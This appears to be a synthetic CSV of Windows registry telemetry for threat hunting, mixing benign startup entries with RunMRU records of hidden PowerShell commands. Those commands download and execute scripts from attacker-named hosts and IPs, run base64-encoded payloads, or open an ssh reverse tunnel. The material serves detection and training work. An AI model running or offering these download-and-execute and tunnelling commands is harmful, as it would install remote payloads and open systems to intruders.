Timestamp,DeviceId,DeviceName,ActionType,RegistryKey,RegistryValueName,RegistryValueData,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-03-23T21:51:22.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1008\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,c,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://kimsuky-c2.live/stage2.ps1)""",explorer.exe,8742,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,swilson,CORP,S-1-5-21-3456789012-1234567890-987654321-1008,232a5e8226996aabdaaf7529deeff82a
2026-03-24T17:54:21.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1009\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,c,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwAxADkAMwAuADEANAAyAC4AMQA0A,explorer.exe,9191,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,72730e7b7f9ad277db496e6d1688782f
2026-03-25T17:44:53.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1010\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,c,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://91.92.240.13/kims",explorer.exe,9531,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,eanderson,CORP,S-1-5-21-3456789012-1234567890-987654321-1010,aebbaf9c0a35653cf57a431e3e6b74fd
2026-03-26T20:27:13.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1005\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,d,"powershell.exe -W Hidden -NoP -Ep Bypass -c ""iex(iwr https://muddywater-c2.icu/payload)""",explorer.exe,9788,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,390fecf5e8410a39f9012b9c6057153a
2026-03-27T19:51:33.000Z,e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-001,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1006\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,d,"powershell.exe -WindowStyle Hidden -c ""IEX(irm 'https://185.234.247.12/mw/ldr')""",explorer.exe,10072,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,rthomas,CORP,S-1-5-21-3456789012-1234567890-987654321-1006,093b4d72ac8cdcaf2b633b189d7d1756
2026-03-28T21:23:42.000Z,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,CORP-LT-002,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1007\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,d,powershell.exe -EncodedCommand aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlA,explorer.exe,10257,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,ac565da653391df45ae86d1848dc1e26
2026-03-29T21:18:33.000Z,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-006,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1009\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,e,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://filefix-cdn.shop/fix.ps1)""",explorer.exe,10527,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,a3760c2d7b31dcdc40d91a8e1f44aa88
2026-03-30T22:12:09.000Z,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-004,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1010\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,e,"powershell.exe -ep bypass -w hidden -c ""irm https://91.242.33.14/ff | iex""",explorer.exe,10545,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,eanderson,CORP,S-1-5-21-3456789012-1234567890-987654321-1010,279b637c9255273fed0940f792174fb0
2026-03-20T21:18:03.000Z,e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,CORP-WS-007,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1011\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -W Hidden -NoP -c ""ssh -o StrictHostKeyChecking=no -R 8080:localhost:80 tunnel@91.242",explorer.exe,24980,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,oivanov,CORP,S-1-5-21-3456789012-1234567890-987654321-1011,76928897093b7b78d05b828d4d6d4023
2026-03-21T18:30:26.000Z,f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,CORP-WS-008,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1012\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,"powershell.exe -WindowStyle Hidden -c ""iex(iwr 'https://185.220.101.45/apt28/ldr')""",explorer.exe,38696,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,pkovalev,CORP,S-1-5-21-3456789012-1234567890-987654321-1012,202b151fcd04930f3da10bcac204d86c
2026-03-22T20:17:51.000Z,a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,CORP-LT-005,RegistryValueSet,HKEY_USERS\S-1-5-21-3456789012-1234567890-987654321-1013\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,a,powershell.exe -EncodedCommand cwBzAGgAIAAtAG8AIABTAHQAcgBpAGMAdABIAG8AcwB0AEsAZQB5AEMAaABlAGMAawBpA,explorer.exe,5620,9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b,ssokolov,CORP,S-1-5-21-3456789012-1234567890-987654321-1013,55621adbc938443d0a6179f26aaf9ace
2026-03-17T12:52:51.000Z,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-006,RegistryValueSet,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,OneDrive,C:\Program Files\Microsoft OneDrive\OneDrive.exe /background,msiexec.exe,19854,9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d,ptaylor,CORP,S-1-5-21-3456789012-1234567890-987654321-1009,b3510ddc595186208769ee241875589a
2026-03-09T10:26:49.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,Teams,C:\Users\Public\Teams\Update.exe --processStart Teams.exe,Teams.exe,19938,131914ec0fae27aa8103d0685faeffa072ece252,kwilliams,CORP,S-1-5-21-3456789012-1234567890-987654321-1004,1458771da27a2bda1713742bd862042e
2026-03-25T10:03:27.000Z,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-LT-003,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,Slack,C:\Users\jsmith\AppData\Local\slack\slack.exe --startup,slack.exe,20068,1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f,cmartin,CORP,S-1-5-21-3456789012-1234567890-987654321-1007,f8401eea5f8f85382ba4d656610c5ade
2026-03-16T18:31:04.000Z,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,CORP-WS-003,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,i,mspaint.exe,explorer.exe,50575,0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e,abrown,CORP,S-1-5-21-3456789012-1234567890-987654321-1003,c58180489ee2eeda84c085934f6f3887
2026-03-17T17:19:35.000Z,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,CORP-WS-004,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,j,wordpad.exe,explorer.exe,45997,0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e,kwilliams,CORP,S-1-5-21-3456789012-1234567890-987654321-1004,e4c9b995fdc3b0900109560f6882f467
2026-03-19T01:19:21.000Z,e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,CORP-LT-001,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,k,winver.exe,explorer.exe,23074,0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e,ldavis,CORP,S-1-5-21-3456789012-1234567890-987654321-1005,57c2b01248c48dec9d92fa7f1b31f7eb
2026-03-19T23:12:41.000Z,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,CORP-WS-001,RegistryValueSet,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Zoom,C:\Program Files\Zoom\bin\Zoom.exe,msiexec.exe,20941,0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e,jsmith,CORP,S-1-5-21-3456789012-1234567890-987654321-1001,da2d79c5cbcf382c76173d89be6528e8
2026-03-20T17:08:46.000Z,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,CORP-WS-002,RegistryValueSet,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,Spotify,C:\Users\jsmith\AppData\Roaming\Spotify\Spotify.exe,Spotify.exe,23309,0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e,mjones,CORP,S-1-5-21-3456789012-1234567890-987654321-1002,3f2a0057a19fda66d70b110ba435601a
